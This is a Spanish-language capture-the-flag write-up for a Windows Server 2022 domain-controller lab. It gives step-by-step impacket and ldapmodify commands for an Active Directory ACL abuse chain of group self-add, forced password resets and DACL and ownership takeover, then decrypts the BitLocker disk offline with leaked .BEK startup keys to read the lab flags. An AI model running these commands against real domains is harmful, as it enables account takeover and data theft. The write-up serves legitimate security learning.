---
tags: [ctf, thehackerslabs, writeup, windows, active-directory, bitlocker, resuelto]
plataforma: The Hackers Labs
os: Windows Server 2022
dificultad: media-alta
estado: Resuelto
fecha: 2026-10-20
---

# Elevator — Roadmap / Writeup

> [!success] Resuelto
> - **USER flag:** `becbd588e130ecd0faea547fec3ab81e` ✅
> - **ROOT flag:** `a6fe6dcd34b4978ec1f3b8450aa3c886` ✅

Nota principal: [[Elevator]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| SO | Windows Server 2022 (Domain Controller) |
| Hipervisor | VirtualBox |
| Red | Host-Only `vboxnet0` |
| DC | `ELEVATOR` / `elevator.bloodhound.thl` |
| IP | `192.168.56.104` |
| Dominio | `bloodhound.thl` |
| Credencial inicial | `john.smith` / `Rk436\#Z4&` |
| Disco principal | BitLocker, imagen `elev.raw` (50 GB) |
| Disco auxiliar | NTFS 10 MB `Bitlocker`, imagen `elev_seed.ntfs` |
| Flags | `C:\Users\Administrador\Desktop\user.txt` y `root.txt` |

> [!warning] Contraseña inicial
> La contraseña de `john.smith` lleva una **barra invertida literal**: `Rk436\#Z4&`.
> En shell hay que entrecomillarla: `'Rk436\#Z4&'`.

---

## 1. Reconocimiento

### 1.1 Puertos y SMB

```bash
nmap -sV -sC -p- 192.168.56.104
```

Servicios relevantes: `53` (DNS), `88` (Kerberos), `389/636` (LDAP), `445` (SMB), `5985` (WinRM).

```bash
nxc smb 192.168.56.104 -u 'john.smith' -p 'Rk436\#Z4&'
```

Resultado: autenticación válida, `Windows Server 2022 Build 20348`, dominio `bloodhound.thl`, `signing:True`.

### 1.2 BloodHound

```bash
bloodhound-python -c All \
  -u 'john.smith' \
  -p 'Rk436\#Z4&' \
  -d bloodhound.thl \
  -ns 192.168.56.104 \
  -dc elevator.bloodhound.thl
```

> El host no resuelve `bloodhound.thl` por DNS; usar `-ns 192.168.56.104` o la IP del DC.

Los JSON quedaron en `work/bh_data/`. El grafo muestra la cadena de la sección 2.

### 1.3 Usuarios y grupos relevantes

| Objeto | SID |
|---|---|
| `JOHN.SMITH` | `S-1-5-21-3580157585-956322742-780763674-1109` |
| `FINANZAS` (grupo) | `...-1110` |
| `MARY.JOHNSON` | `...-1111` |
| `ROBERT.WILLIAMS` | `...-1112` |
| `MARKETING` (grupo) | `...-1113` |
| `PATRICIA.BROWN` | `...-1114` |
| `OPERACIONES` (grupo) | `...-1115` |
| `MICHAEL.JONES` | `...-1108` |

> Ojo: existen **OU OPERACIONES** y **grupo OPERACIONES**. El ACE de `WriteOwner` apunta al **grupo** (`...-1115`), no a la OU.

---

## 2. Cadena AD identificada

```text
JOHN.SMITH  --AddSelf-->             FINANZAS
FINANZAS    --GenericAll-->          MARY.JOHNSON
MARY.JOHNSON --ForceChangePassword--> ROBERT.WILLIAMS
ROBERT.WILLIAMS (MARKETING) --WriteDacl--> PATRICIA.BROWN
PATRICIA.BROWN --WriteOwner-->       OPERACIONES (grupo)
PATRICIA.BROWN (owner) --WriteDacl/WriteMembers--> OPERACIONES
```

- `john.smith` no tiene grupos privilegiados, pero puede **añadirse a sí mismo** a `FINANZAS`.
- `FINANZAS` tiene `GenericAll` sobre `mary.johnson` → reset de contraseña.
- `mary.johnson` tiene `ForceChangePassword` sobre `robert.williams` → reset.
- `robert.williams` es miembro de `MARKETING`; ese grupo tiene `WriteDacl` sobre `patricia.brown` → conceder `FullControl` y resetear.
- `patricia.brown` tiene `WriteOwner` sobre el grupo `OPERACIONES` → tomar posesión, editar DACL y añadir miembros.

---

## 3. Explotación AD paso a paso

> [!note] Herramientas
> `bloodyAD` falló por un conflicto de `cryptography` instalado en `~/.local` (`ImportError: cannot import name 'asn1'`). Se usaron `ldapmodify`, `impacket-*` y `ldap3` con `PYTHONNOUSERSITE=1`.

### 3.1 AddSelf: `john.smith` → `FINANZAS`

Crear el LDIF:

```ldif
dn: CN=FINANZAS,OU=FINANZAS,DC=bloodhound,DC=thl
changetype: modify
add: member
member: CN=John Smith,OU=finanzas,DC=bloodhound,DC=thl
```

Aplicarlo como `john.smith`:

```bash
ldapmodify -x -H ldap://192.168.56.104 \
  -D 'john.smith@bloodhound.thl' \
  -w 'Rk436\#Z4&' \
  -f add_finanzas.ldif
```

Verificar:

```bash
ldapsearch -x -H ldap://192.168.56.104 \
  -D 'john.smith@bloodhound.thl' -w 'Rk436\#Z4&' \
  -b 'DC=bloodhound,DC=thl' \
  '(sAMAccountName=john.smith)' memberOf
```

Debe aparecer `CN=finanzas,OU=finanzas,DC=bloodhound,DC=thl`.

### 3.2 `GenericAll` de FINANZAS → reset de `mary.johnson`

```bash
impacket-changepasswd -reset \
  -dc-ip 192.168.56.104 \
  -altuser 'bloodhound.thl/john.smith' \
  -altpass 'Rk436\#Z4&' \
  -newpass 'P@ssw0rd123!' \
  'bloodhound.thl/mary.johnson@192.168.56.104'
```

Verificar:

```bash
PYTHONNOUSERSITE=1 nxc smb 192.168.56.104 \
  -u 'mary.johnson' -p 'P@ssw0rd123!'
```

> `-reset` es obligatorio: sin él, Impacket pide la contraseña actual del objetivo.
> El objetivo se pasa como `dominio/usuario@IP`; el `-altuser` es quien autentica.

### 3.3 `ForceChangePassword` de MARY → reset de `robert.williams`

```bash
impacket-changepasswd -reset \
  -dc-ip 192.168.56.104 \
  -altuser 'bloodhound.thl/mary.johnson' \
  -altpass 'P@ssw0rd123!' \
  -newpass 'P@ssw0rd123!' \
  'bloodhound.thl/robert.williams@192.168.56.104'
```

Verificar con `nxc smb 192.168.56.104 -u 'robert.williams' -p 'P@ssw0rd123!'`.

### 3.4 `WriteDacl` de MARKETING → control de `patricia.brown`

```bash
PYTHONNOUSERSITE=1 impacket-dacledit -action write -rights FullControl \
  -principal 'robert.williams' \
  -target-dn 'CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl' \
  -dc-ip 192.168.56.104 \
  'bloodhound.thl/robert.williams:P@ssw0rd123!'
```

Resetear la contraseña de Patricia:

```bash
impacket-changepasswd -reset \
  -dc-ip 192.168.56.104 \
  -altuser 'bloodhound.thl/robert.williams' \
  -altpass 'P@ssw0rd123!' \
  -newpass 'P@ssw0rd123!' \
  'bloodhound.thl/patricia.brown@192.168.56.104'
```

### 3.5 `WriteOwner` sobre OPERACIONES + `WriteDacl`/`WriteMembers`

Tomar posesión del grupo:

```bash
PYTHONNOUSERSITE=1 impacket-owneredit -action write \
  -new-owner 'patricia.brown' \
  -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl' \
  -dc-ip 192.168.56.104 \
  'bloodhound.thl/patricia.brown:P@ssw0rd123!'
```

Como propietaria, concederse `FullControl` (incluye `WriteMembers`) sobre el grupo:

```bash
PYTHONNOUSERSITE=1 impacket-dacledit -action write -rights FullControl \
  -principal 'patricia.brown' \
  -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl' \
  -dc-ip 192.168.56.104 \
  'bloodhound.thl/patricia.brown:P@ssw0rd123!'
```

Añadir a `patricia.brown` y a `john.smith` al grupo:

```ldif
dn: CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl
changetype: modify
add: member
member: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl
member: CN=John Smith,OU=finanzas,DC=bloodhound,DC=thl
```

```bash
ldapmodify -x -H ldap://192.168.56.104 \
  -D 'patricia.brown@bloodhound.thl' \
  -w 'P@ssw0rd123!' \
  -f add_operaciones.ldif
```

Verificar:

```bash
ldapsearch -x -H ldap://192.168.56.104 \
  -D 'john.smith@bloodhound.thl' -w 'Rk436\#Z4&' \
  -b 'CN=OPERACIONES,OU=OPERACIONES,DC=bloodhound,DC=thl' member
```

### 3.6 Verificación y dead-end de la cadena AD

`OPERACIONES` se controla, pero **no otorga privilegios AD**:

- `tokenGroups` de `patricia.brown` solo devuelve `Domain Users`, `Users` (S-1-5-32-545) y `OPERACIONES`.
- El grupo no está anidado en `Administradores`, `Domain Admins`, `Remote Management Users`, etc.
- El escaneo de **DACLs reales** (`nTSecurityDescriptor` + control `LDAP_SERVER_SD_FLAGS_OID`) no muestra ningún ACE saliente de `OPERACIONES`.
- `impacket-secretsdump -just-dc` como `patricia.brown` o `john.smith` devuelve `ERROR_DS_DRA_BAD_DN`; Impacket documenta que ese error está relacionado con **falta de privilegios DRSUAPI**.
- El share `E$` sigue devolviendo `NT_STATUS_ACCESS_DENIED` para ambos.

Conclusión: la cadena AD es válida hasta `OPERACIONES`, pero **no llega a DCSync**. Las flags se obtienen por la vía BitLocker.

---

## 4. BitLocker: la vía que da las flags

### 4.1 Disco auxiliar: extraer los `.BEK`

El disco auxiliar es un NTFS de 10 MB etiquetado `Bitlocker`:

```bash
fsstat elev_seed.ntfs
fls -r -p elev_seed.ntfs
```

Contiene tres archivos `.BEK`:

```text
3A496C65-3B8B-4342-9B1E-43AB1D13BBDE.BEK
65820C39-C891-47C6-86C1-7EC00B0567AE.BEK
5A026BA1-4169-42E5-8F92-5402A1819DCA.BEK
```

Extraerlos por inodo:

```bash
icat elev_seed.ntfs 43 > 'bek/3A496C65-3B8B-4342-9B1E-43AB1D13BBDE.BEK'
icat elev_seed.ntfs 44 > 'bek/65820C39-C891-47C6-86C1-7EC00B0567AE.BEK'
icat elev_seed.ntfs 45 > 'bek/5A026BA1-4169-42E5-8F92-5402A1819DCA.BEK'
```

Son archivos de **180 bytes** con una estructura `ExternalKey`: no son recovery passwords cifradas, sino **startup keys en claro** de BitLocker.

### 4.2 Layout del disco principal

```bash
mmls elev.raw
```

Particiones relevantes:

| Slot | Inicio (sectores) | Descripción |
|---|---|---|
| 000:000 | 2048 | NTFS (arranque) |
| **000:001** | **206848** | **NTFS/BitLocker — volumen `C:`** |
| 000:002 | 103688192 | Tipo `0x27` (recuperación/auxiliar) |

Offset en bytes del volumen BitLocker:

```text
206848 × 512 = 105906176
```

### 4.3 Identificar los protectores BitLocker

`cryptsetup bitlkDump` no acepta `--offset`, así que se crea una **copia sparse** de la partición con el primer y último tramo (suficiente para los metadatos):

```bash
SIZE=$((103481344*512))
truncate -s $SIZE elev_part2.raw

# Primeros 128 MB de la partición
dd if=elev.raw of=elev_part2.raw bs=512 \
  skip=206848 count=262144 conv=notrunc status=none

# Últimos 128 MB de la partición
dd if=elev.raw of=elev_part2.raw bs=512 \
  skip=$((206848+103481344-262144)) count=262144 \
  seek=$((103481344-262144)) conv=notrunc status=none

cryptsetup bitlkDump elev_part2.raw
```

Salida relevante:

```text
Version:      2
GUID:         5f78d641-12fd-46c6-b7c4-d74f52b7e46e
Description:  ELEVATOR C: 12/08/2025
Cipher name:  aes
Cipher mode:  cbc-eboiv
Cipher key:   256 [bits]

Keyslots:
 0: VMK
    Name:        ExternalKey
    GUID:        65820c39-c891-47c6-86c1-7ec00b0567ae
    Protection:  VMK protected with startup key
 1: VMK
    Name:        ExternalKey
    GUID:        5a026ba1-4169-42e5-8f92-5402a1819dca
    Protection:  VMK protected with startup key
 2: FVEK
```

Los GUIDs coinciden con los `.BEK` extraídos. Cualquiera de las dos startup keys sirve.

### 4.4 Validar la startup key

```bash
cryptsetup open --type bitlk --test-passphrase \
  --key-file 'bek/65820C39-C891-47C6-86C1-7EC00B0567AE.BEK' \
  --keyfile-size 180 \
  elev_part2.raw
```

Sin salida y con código de salida `0` = clave válida.

### 4.5 `dislocker` local (sin root)

`dislocker` no estaba instalado. Se descarga y extrae el `.deb` junto con sus dependencias:

```bash
mkdir -p /tmp/opencode/dislocker_pkg
cd /tmp/opencode

apt-get download dislocker libdislocker0.7t64 \
  libmbedcrypto16 libmbedtls21 libmbedx509-7

for d in dislocker_*.deb libdislocker*.deb libmbed*.deb; do
  dpkg-deb -x "$d" dislocker_pkg
done
```

Montar el volumen con FUSE. `-O` es el **offset en bytes**:

```bash
export LD_LIBRARY_PATH=/tmp/opencode/dislocker_pkg/usr/lib:/tmp/opencode/dislocker_pkg/usr/lib/x86_64-linux-gnu

mkdir -p /tmp/opencode/mnt_elev
nohup /tmp/opencode/dislocker_pkg/usr/bin/dislocker-fuse \
  -V /home/edison/CTF/maquina-100/work/elev.raw \
  -O 105906176 \
  -f '/home/edison/CTF/maquina-100/work/bek/65820C39-C891-47C6-86C1-7EC00B0567AE.BEK' \
  -r -s -v -- /tmp/opencode/mnt_elev \
  >/tmp/opencode/dislocker.log 2>&1 &

sleep 5
mount | grep mnt_elev
ls -la /tmp/opencode/mnt_elev
```

El montaje expone el volumen descifrado como un único archivo:

```text
/tmp/opencode/mnt_elev/dislocker-file
```

### 4.6 Leer las flags del NTFS descifrado

```bash
fls -r -p /tmp/opencode/mnt_elev/dislocker-file \
  | grep -iE 'user\.txt|root\.txt'
```

Resultado:

```text
r/r 24424-128-1:	Users/Administrador/Desktop/user.txt
r/r 24431-128-1:	Users/Administrador/Desktop/root.txt
```

Extraer:

```bash
icat /tmp/opencode/mnt_elev/dislocker-file 24424
icat /tmp/opencode/mnt_elev/dislocker-file 24431
```

---

## 5. Flags

| Flag | Valor | Ubicación |
|---|---|---|
| **USER** | `becbd588e130ecd0faea547fec3ab81e` | `C:\Users\Administrador\Desktop\user.txt` |
| **ROOT** | `a6fe6dcd34b4978ec1f3b8450aa3c886` | `C:\Users\Administrador\Desktop\root.txt` |

> Verificado con `xxd`: los ficheros contienen exactamente 32 caracteres hexadecimales, sin salto de línea ni texto extra.

---

## 6. Notas y problemas encontrados

- **`bloodyAD` roto por `cryptography` de `~/.local`**: usar `PYTHONNOUSERSITE=1` o las alternativas `ldapmodify`/Impacket.
- **`impacket-changepasswd`**: sin `-reset` pide la contraseña actual del objetivo; el objetivo va como `dominio/usuario@IP`.
- **`@` en contraseñas**: en herramientas de Impacket que usan el formato `dominio/usuario:password@host`, un `@` en la contraseña rompe el parseo. Usar `-hashes` o `-altpass` por separado.
- **GPO Default Domain Policy**: añade a `michael.jones` (SID `...-1108`) a `Usuarios de administración remota`. `michael.jones` es miembro de **Builtin Administrators**, pero no se encontró ningún derecho ACL de bajo privilegio sobre él; sin DCSync no se puede resetear.
- **AdminSDHolder / RBCD / LAPS**: revisados; no hay ACEs para `OPERACIONES` ni RBCD/LAPS explotable en el DC.
- **`E$`**: share administrativo del disco auxiliar; `NT_STATUS_ACCESS_DENIED` para usuarios no administradores, incluso con `OPERACIONES`.
- **BitLocker**: las startup keys están en el disco auxiliar, por lo que el cifrado no protege el volumen frente a un acceso offline al disco.

---

## 7. Lecciones aprendidas

1. **BloodHound no es la verdad absoluta**: validar las DACLs reales con `nTSecurityDescriptor` y el control `SD_FLAGS` (`1.2.840.113556.1.4.801`) evita perseguir edges incompletos.
2. **Cadena ACL clásica**: `AddSelf` → `GenericAll` → `ForceChangePassword` → `WriteDacl` → `WriteOwner` → `WriteMembers`.
3. **No toda cadena termina en DCSync**: un grupo controlado puede no tener ACEs salientes ni estar anidado; hay que comprobar `tokenGroups`, DACLs y DRSUAPI.
4. **BitLocker offline**: las startup keys `.BEK` permiten montar el volumen con `dislocker` sin recovery password ni root.
5. **`cryptsetup bitlkDump`** sobre una copia sparse (primer/último tramo) identifica protectores y GUIDs sin copiar los 50 GB.
6. **`dislocker` en espacio de usuario**: extraer el `.deb` y sus dependencias, ajustar `LD_LIBRARY_PATH` y montar con FUSE.
7. **Sleuthkit** (`fls`/`icat`) lee directamente el `dislocker-file` como imagen NTFS, sin necesidad de montar el volumen descifrado con root.
